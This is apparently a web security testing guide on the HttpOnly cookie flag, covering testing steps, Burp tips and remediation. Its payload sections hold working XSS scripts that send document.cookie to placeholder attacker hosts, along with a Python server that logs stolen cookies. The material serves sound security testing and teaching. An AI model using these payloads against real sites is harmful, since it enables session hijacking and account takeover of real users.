# Cookie HttpOnly Flag

## Overview
The `HttpOnly` flag on a cookie instructs the browser to deny JavaScript access to the cookie value, preventing it from being read via `document.cookie` or any client-side script. Without this flag, an attacker who finds an XSS vulnerability can trivially steal session cookies using a single line of JavaScript, even if the XSS payload has no other capabilities. The `HttpOnly` flag is one of the most critical defense-in-depth controls for session management because it breaks the standard XSS-to-session-hijacking attack chain.

## How It Works
- A session cookie is set without the `HttpOnly` flag: `Set-Cookie: session=abc123; Secure; Path=/`
- An attacker discovers an XSS vulnerability anywhere on the domain (even in a minor feature).
- The XSS payload reads the cookie: `fetch("https://attacker.com/steal?c=" + document.cookie)`
- The victim's browser executes the payload, sending their session cookie to the attacker's server.
- The attacker injects the cookie into their browser and hijacks the session — no credentials required.
- With `HttpOnly` set, `document.cookie` returns an empty string for that cookie, breaking the theft chain.

## Impact
- Direct session cookie theft via any XSS vulnerability on the domain.
- Complete account takeover without requiring the victim's password.
- Even minor, low-severity XSS vulnerabilities become critical session hijacking vectors.
- Affects all users who visit any page with an XSS payload.
- Worm-able if stored XSS is combined with cookie theft and attacker-controlled actions.

## Where to Look
- All `Set-Cookie` response headers — check every endpoint that issues or renews cookies.
- Login, registration, session renewal, and OAuth callback responses.
- Third-party scripts and SDKs that set their own cookies (analytics, chat, CRM widgets).
- Admin panels and internal tools that may have more relaxed cookie policies.
- Browser DevTools > Application > Cookies — the `HttpOnly` column shows the flag status visually.
- Burp Suite Proxy history — filter for responses containing `Set-Cookie`.

## Testing Steps
1. Log in to the application and intercept the `Set-Cookie` response header.
2. Check whether the `HttpOnly` attribute is present on the session cookie.
3. Open the browser's JavaScript console (F12 > Console) on any page within the authenticated session.
4. Type `document.cookie` and press Enter.
5. If the session cookie value appears in the output, the `HttpOnly` flag is NOT set — VULNERABLE.
6. If the session cookie is absent from `document.cookie` output but other cookies appear, `HttpOnly` is correctly set.
7. Test for XSS-to-cookie-theft combination: find any XSS point and inject: `<script>document.location='https://YOUR_SERVER/?c='+document.cookie</script>`
8. If the cookie is not `HttpOnly`, the request to your server will include the session cookie value.
9. Check all cookies in the application, not just the session cookie (CSRF tokens, preferences, auth tokens).
10. Verify third-party cookies: analytics and tracking cookies that are not HttpOnly can confirm domain cookie access for attackers.

## Payloads / Techniques

```javascript
// In browser console: test if session cookie is readable
console.log(document.cookie);
// If session=abc123 appears -> HttpOnly NOT set, VULNERABLE
// If session cookie is absent -> HttpOnly is set correctly

// XSS payload to steal cookies (use on your own server for testing)
<script>
var img = new Image();
img.src = "https://attacker.com/collect?cookie=" + encodeURIComponent(document.cookie);
</script>

// XSS via fetch
<script>
fetch("https://attacker.com/collect", {
  method: "POST",
  body: JSON.stringify({cookie: document.cookie, url: location.href}),
  headers: {"Content-Type": "application/json"}
});
</script>

// XSS via XMLHttpRequest (old-style)
<script>
var x = new XMLHttpRequest();
x.open("GET", "https://attacker.com/steal?c=" + document.cookie);
x.send();
</script>
```

```bash
# Check HttpOnly flag with curl
curl -si https://target.com/login -X POST \
  -d "username=test&password=Test1234!" | grep -i "set-cookie"

# Look for:
# VULNERABLE: Set-Cookie: session=abc123; Secure; Path=/
# SECURE:     Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Strict; Path=/
```

```python
import requests

def check_httponly(url, method="GET", data=None):
    """Check all cookies for missing HttpOnly flag."""
    r = requests.request(method, url, data=data, allow_redirects=True)
    for cookie in r.cookies:
        has_httponly = cookie.has_nonstandard_attr("HttpOnly") or cookie._rest.get("HttpOnly") is not None
        # requests library exposes this differently:
        flags = []
        if cookie.secure:
            flags.append("Secure")
        # Check raw header for HttpOnly
    
    # Check raw Set-Cookie headers
    raw = r.headers.get("Set-Cookie", "")
    if raw:
        if "httponly" not in raw.lower():
            print(f"[VULNERABLE] Cookie missing HttpOnly: {raw[:100]}")
        else:
            print(f"[OK] HttpOnly present")

# Test login endpoint
check_httponly("https://target.com/login", "POST",
               {"username": "test", "password": "Test1234!"})
```

```python
# Receive stolen cookies (run on attacker server)
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse

class StolenCookieHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        query = parse_qs(urlparse(self.path).query)
        if "cookie" in query:
            print(f"\n[!] STOLEN COOKIE: {query['cookie'][0]}")
        self.send_response(200)
        self.end_headers()
    def log_message(self, *args): pass

HTTPServer(("0.0.0.0", 80), StolenCookieHandler).serve_forever()
```

## Burp Suite Tips
- **Passive Scanner**: Burp Suite automatically flags cookies without `HttpOnly` as low-severity findings during passive scans. Check Issues after spidering the target.
- **Proxy History Search**: Use Ctrl+F in Proxy history to search for `Set-Cookie` — examine each result for the presence of `HttpOnly`.
- **XSS + Cookie Theft Combo**: When you find an XSS vulnerability, use Burp Collaborator as your exfiltration endpoint. Inject: `<script>fetch("https://YOUR_COLLABORATOR_PAYLOAD/?c="+document.cookie)</script>` — Collaborator will log the incoming request with the stolen cookie.
- **Collaborator Client**: Monitor Burp Collaborator for incoming DNS/HTTP interactions triggered by your XSS payloads to confirm cookie theft out-of-band.
- **Extensions — Cookie Manager**: Lists all cookies observed during a session with their security attributes for easy auditing.

## Tools
- **Burp Suite** — passive scanner, proxy, and Collaborator for XSS + cookie theft.
- **OWASP ZAP** — active/passive scanner with cookie flag checks.
- **XSSHunter** — hosted XSS payload service that captures cookies and page content.
- **BeEF (Browser Exploitation Framework)** — hooks browsers via XSS and can extract cookies, take screenshots, and run commands.
- **Caido** — modern web security proxy with built-in cookie analysis.
- **curl / wget** — simple header inspection.

## Remediation
- Add `HttpOnly` to all session cookies: `Set-Cookie: session=value; HttpOnly; Secure; SameSite=Strict; Path=/`
- Framework-specific settings:
  - **Django**: `SESSION_COOKIE_HTTPONLY = True` (default True)
  - **Express.js**: `res.cookie("session", value, { httpOnly: true })`
  - **PHP**: `session_set_cookie_params(["httponly" => true])` or `ini_set('session.cookie_httponly', 1)`
  - **ASP.NET**: `<httpCookies httpOnlyCookies="true" />` in web.config
  - **Spring Boot**: `server.servlet.session.cookie.http-only=true`
- Apply `HttpOnly` to ALL cookies that do not require client-side access — not just the session cookie.
- Implement a Content Security Policy (CSP) as a secondary defense: `Content-Security-Policy: default-src 'self'` limits where JavaScript can send data even if `HttpOnly` is missing.
- Conduct regular XSS audits — `HttpOnly` and XSS prevention are complementary, not alternatives.
- Review third-party and CDN scripts that may set their own non-HttpOnly cookies.

## References
https://owasp.org/www-community/HttpOnly
https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#restrict_access_to_cookies
https://portswigger.net/web-security/cross-site-scripting/exploiting
https://cwe.mitre.org/data/definitions/1004.html
https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#httponly-attribute
https://tools.ietf.org/html/rfc6265#section-4.1.2.6
